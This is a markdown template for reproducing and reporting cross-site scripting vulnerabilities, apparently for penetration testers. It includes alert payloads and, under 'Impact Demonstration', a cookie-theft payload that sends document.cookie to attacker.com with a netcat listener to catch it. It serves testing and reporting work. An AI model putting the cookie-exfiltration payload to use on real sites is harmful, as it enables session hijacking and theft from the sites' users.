# XSS Vulnerability Reproduction Guide

This document provides step-by-step instructions for reproducing XSS vulnerabilities in a standardized report format.

---

## Reproduction Template

### Vulnerability Information
- **Vulnerability Type**: Cross-Site Scripting (XSS)
- **Subtype**: [Reflected/Stored/DOM-based]
- **Affected Parameter**: [parameter name]
- **Affected URL**: [target URL]
- **HTTP Method**: [GET/POST]
- **Authentication Required**: [Yes/No]

### Environment Details
- **Browser**: [Chrome 118.0.5993.70 / Firefox 119.0 / etc.]
- **Operating System**: [Windows 11 / macOS 14 / Ubuntu 22.04]
- **Testing Tool**: [Burp Suite Professional 2023.10.3.7]
- **Date of Testing**: [YYYY-MM-DD]

---

## Step-by-Step Reproduction

### Step 1: Access Target Application
```
1. Open web browser
2. Navigate to: [TARGET_URL]
3. Log in (if authentication required): [credentials/method]
4. Navigate to vulnerable page: [VULNERABLE_PAGE_URL]
```

### Step 2: Identify Injection Point
```
1. Locate the input field/parameter: [PARAMETER_NAME]
2. Observe where user input is reflected in the response
3. Note the context (HTML body/attribute/JavaScript/etc.)
```

### Step 3: Test for Basic XSS
```
Payload: <script>alert('XSS')</script>

1. Insert payload in the identified parameter
2. Submit the request
3. Observe if alert popup appears
```

**Expected Result**: No script execution, proper encoding/filtering
**Actual Result**: [Describe what happened - alert popup, script execution, etc.]

### Step 4: Capture HTTP Request/Response

#### HTTP Request:
```http
[COPY EXACT REQUEST FROM BURP SUITE]
GET /vulnerable-endpoint?param=<script>alert('XSS')</script> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0...
[...additional headers...]
```

#### HTTP Response:
```http
[COPY EXACT RESPONSE FROM BURP SUITE]
HTTP/1.1 200 OK
Content-Type: text/html
[...headers...]

<html>
<body>
  <p>You searched for: <script>alert('XSS')</script></p>
  [...response body...]
</body>
</html>
```

### Step 5: Proof of Concept (PoC)

#### Working Payload:
```javascript
[EXACT PAYLOAD THAT WORKED]
<script>alert(document.domain)</script>
```

#### Browser Evidence:
- **Screenshot**: [Attach screenshot showing alert popup with domain]
- **Console Output**: [Any JavaScript console messages]
- **Network Tab**: [Request/response in browser dev tools]

### Step 6: Impact Demonstration

#### Session Cookie Theft PoC:
```javascript
Payload: <script>document.location='http://attacker.com/steal?c='+document.cookie</script>

Steps:
1. Set up listener: nc -lvp 80
2. Insert payload in vulnerable parameter
3. Observe cookie in listener output
```

**Result**: [Describe if cookies were captured]

---

## Evidence Collection

### Required Screenshots:
1. **Vulnerability confirmation**: Alert popup or script execution
2. **Burp Suite request/response**: Full HTTP traffic
3. **Browser developer tools**: Network/Console tabs
4. **Impact demonstration**: Cookie theft or other malicious action

### Required Files:
1. **Burp Suite project file**: Save session for reproduction
2. **HTTP traffic log**: Export requests/responses
3. **Video recording**: Complete exploitation process (optional)

---

## Vulnerability Validation Checklist

- [ ] **Basic XSS confirmed**: Alert popup displayed
- [ ] **Domain verification**: Alert shows correct target domain
- [ ] **Context identified**: HTML/Attribute/JavaScript context documented
- [ ] **HTTP traffic captured**: Request/response saved
- [ ] **Payload documented**: Exact working payload recorded
- [ ] **Impact assessed**: Real-world exploitation potential evaluated
- [ ] **Screenshots captured**: Visual evidence collected
- [ ] **Reproducible**: Steps can be followed by others

---

## Common Reproduction Issues

### Issue 1: Alert Not Appearing
**Possible Causes**:
- Browser popup blocker enabled
- Content Security Policy (CSP) blocking execution
- Input encoding/filtering preventing execution
- Wrong injection context

**Solutions**:
- Check browser console for CSP violations
- Try different payloads for the context
- Use browser dev tools to inspect HTML source
- Test with different browsers

### Issue 2: Payload Not Reflected
**Possible Causes**:
- Parameter not included in response
- Server-side filtering removing payload
- URL encoding issues
- Wrong HTTP method

**Solutions**:
- Verify parameter name spelling
- Check response body thoroughly
- Try URL encoding/decoding
- Test both GET and POST methods

### Issue 3: Inconsistent Results
**Possible Causes**:
- Caching affecting responses
- Session-dependent behavior
- Rate limiting or WAF interference
- Browser state differences

**Solutions**:
- Clear browser cache and cookies
- Test in incognito/private mode
- Use different IP/user agent
- Wait between requests

---

## Report Format Template

```markdown
## Summary
**Vulnerability**: Cross-Site Scripting (XSS)
**Severity**: [High/Medium/Low]
**CVSS Score**: [X.X]
**Affected Component**: [Parameter/URL]

## Description
[Brief description of the vulnerability]

## Reproduction Steps
1. [Step 1]
2. [Step 2]
3. [Step 3]

## Proof of Concept
**Payload**: `[working payload]`
**URL**: `[vulnerable URL]`
**Evidence**: [Screenshot/Description]

## Impact
[Describe potential impact - session hijacking, data theft, etc.]

## Remediation
[Link to remediation.md or brief fix guidance]
```

---

## Testing Methodology

### Phase 1: Discovery
- Identify all user input points
- Map input reflection in responses
- Categorize injection contexts

### Phase 2: Confirmation
- Test basic XSS payloads
- Verify script execution
- Document working payloads

### Phase 3: Exploitation
- Demonstrate real-world impact
- Create weaponized payloads
- Test against defenses

### Phase 4: Documentation
- Capture all evidence
- Write clear reproduction steps
- Assess business impact

---

## Quality Assurance

### Before Submitting Report:
- [ ] **Tested in clean browser**: No cache/extensions affecting results
- [ ] **Verified payload syntax**: No typos in payloads
- [ ] **Screenshots are clear**: Evidence is visible and understandable
- [ ] **Steps are complete**: Another person can reproduce
- [ ] **Impact is explained**: Business risk is clear
- [ ] **Remediation suggested**: Fix guidance provided

---

## References

- [OWASP Testing Guide - XSS](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting)
- [Burp Suite User Guide](https://portswigger.net/burp/documentation/desktop/getting-started)
- [CVE Database](https://cve.mitre.org/)

---

**Ethical Reminder**: Only test on systems you own or have explicit written permission to test. Document everything for legitimate security improvement purposes.
